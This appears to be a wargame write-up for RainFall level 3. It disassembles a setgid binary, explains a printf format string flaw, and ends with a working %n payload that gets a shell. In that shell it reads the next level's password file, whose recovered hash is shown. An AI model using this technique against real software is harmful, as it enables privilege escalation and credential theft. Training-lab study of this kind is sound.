# level3

## Hint

When we log into the machine as `level3`, we notice a binary:

```shell-session
level3@RainFall:~$ ls -l
total 6
-rwsr-s---+ 1 level4 users  5366 Mar  6  2016 level3
```

We notice that the `guid` bit is set, so the executable gets the rights of its group owners granted when it is executed, and conveniently enough the group in question is our target for the current level.

That being said, it seems we need to look into the binary in order to try to understand what input it's awaiting.

## gdb

First, we'll need to see all available global symbols

```gdb
gdb-peda$ info variables
All defined variables:

Non-debugging symbols:
0x080485f8  _fp_hw
0x080485fc  _IO_stdin_used
0x08048734  __FRAME_END__
0x08049738  __CTOR_LIST__
0x08049738  __init_array_end
0x08049738  __init_array_start
0x0804973c  __CTOR_END__
0x08049740  __DTOR_LIST__
0x08049744  __DTOR_END__
0x08049748  __JCR_END__
0x08049748  __JCR_LIST__
0x0804974c  _DYNAMIC
0x08049818  _GLOBAL_OFFSET_TABLE_
0x0804983c  __data_start
0x0804983c  data_start
0x08049840  __dso_handle
0x08049860  stdin@@GLIBC_2.0
0x08049880  stdout@@GLIBC_2.0
0x08049884  completed.6159
0x08049888  dtor_idx.6161
0x0804988c  m                                               <-- Global variable m, in the bss section of object
```

Now lets look at the functions of the binary

```gdb
gdb-peda$ disas main
Dump of assembler code for function main:
   0x0804851a <+0>:	push   ebp
   0x0804851b <+1>:	mov    ebp,esp
   0x0804851d <+3>:	and    esp,0xfffffff0
   0x08048520 <+6>:	call   0x80484a4 <v>                   <-- Call to v()
   0x08048525 <+11>:	leave
   0x08048526 <+12>:	ret
End of assembler dump.
gdb-peda$ disas v
Dump of assembler code for function v:
   0x080484a4 <+0>:	push   ebp
   0x080484a5 <+1>:	mov    ebp,esp
   0x080484a7 <+3>:	sub    esp,0x218                       <-- Space of 536 bytes allocated for the stack frame
   0x080484ad <+9>:	mov    eax,ds:0x8049860                <-- Load of stdin
   0x080484b2 <+14>:	mov    DWORD PTR [esp+0x8],eax         <-- Set stdin as 3rd argument to fgets()
   0x080484b6 <+18>:	mov    DWORD PTR [esp+0x4],0x200       <-- Set 520 as 2nd argument to fgets()
   0x080484be <+26>:	lea    eax,[ebp-0x208]                 <-- Load char buffer[520]
   0x080484c4 <+32>:	mov    DWORD PTR [esp],eax             <-- Set char buffer as 1st argument to fgets()
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>           <-- Call to fgets(buffer, 0x200, stdin)
   0x080484cc <+40>:	lea    eax,[ebp-0x208]                 <-- Load char buffer[520]
   0x080484d2 <+46>:	mov    DWORD PTR [esp],eax             <-- Set char buffer as 1st argument to printf()
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>          <-- Call to printf with esp as conv string
   0x080484da <+54>:	mov    eax,ds:0x804988c                <-- Load global variable m
   0x080484df <+59>:	cmp    eax,0x40                        <-- Compate m with 0x40
   0x080484e2 <+62>:	jne    0x8048518 <v+116>               <-- If not equivalent jump to v+116
   0x080484e4 <+64>:	mov    eax,ds:0x8049880                <-- Load of stdout
   0x080484e9 <+69>:	mov    edx,eax
   0x080484eb <+71>:	mov    eax,0x8048600                   <-- Load of string "Wait what?!\n"
   0x080484f0 <+76>:	mov    DWORD PTR [esp+0xc],edx         <-- Set stdout as 4th argument to fwrite()
   0x080484f4 <+80>:	mov    DWORD PTR [esp+0x8],0xc         <-- Set 0xc as 3rd argument to fwrite()
   0x080484fc <+88>:	mov    DWORD PTR [esp+0x4],0x1         <-- Set 1 as 2nd argument to fwrite()
   0x08048504 <+96>:	mov    DWORD PTR [esp],eax             <-- Set string "Wait what?!\n" as 1st argument to fwrite()
   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>          <-- Call to fwrite("Wait what?!\n", 1, 0xc, stdout)
   0x0804850c <+104>:	mov    DWORD PTR [esp],0x804860d    <-- Load "/bin/sh" as 1st argument to system()
   0x08048513 <+111>:	call   0x80483c0 <system@plt>       <-- Call to system("/bin/sh")
   0x08048518 <+116>:	leave
   0x08048519 <+117>:	ret
End of assembler dump.
```

# Format String Attack

The vulnerabilty here is clearly the usage of an unsanitized user-defined conversion string and the lack of variadic argument to `printf`. This combination is very dangerous as it allows the user to display data and addresses found in the stack, and it's precisely what is required by this exercise as we can read [here](https://owasp.org/www-community/attacks/Format_string_attack):
> The attack could be executed when the application doesn’t properly validate the submitted input.
> In this case, if a Format String parameter, like %x, is inserted into the posted data, the string is parsed by the Format Function, and the conversion specified in the parameters is executed.
> However, the Format Function is expecting more arguments as input, and if these arguments are not supplied, the function could read or write the stack.

On top of that, we have type conversions and options at our disposal to access arbitrary positionnal arguments on the stack, namely:
- option `$` that is used with an integer `i` to access the `ith` argument positionned after printf
- type conversion `%n` that inserts an integer corresponding to the number of bytes written so far in the type conversion format.

This means:
```c
int randomarg;
int m;
printf("123%2$n", randomarg, &m); //will insert the value 3 at the addres of m
```

# Plan

There is a lot to unpack here, so lets proceed:

1. There is a conditionnal jump that leads to a shell but compares a static symbol `m` and a hardcoded value 64. This variable is outside of the control flow, so we must find a way to edit the contents of this variable without having access to it directly in order to reach the system call
2. The call to `printf` is vulnerable to user input. We can easily access values on the stack by feeding arbitrary conversion format to the function like `%s/p/x/n`
3. The addres of `m` is consistent. Thanks to the lack of ASLR on the VM.
4. By feeding the correct conversion through stdin, we will be able to write the correct value (`64`) in `m` so that the conditionnal jump succeeds and we end up with an open shell.

# Proceed



```shell-session
level3@RainFall:~$ (python -c "print '\x8c\x98\x04\x08' + '%60c' + '%4\$n'"; cat -) | ./level3

Wait what?!
cat /home/user/$(whoami)/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
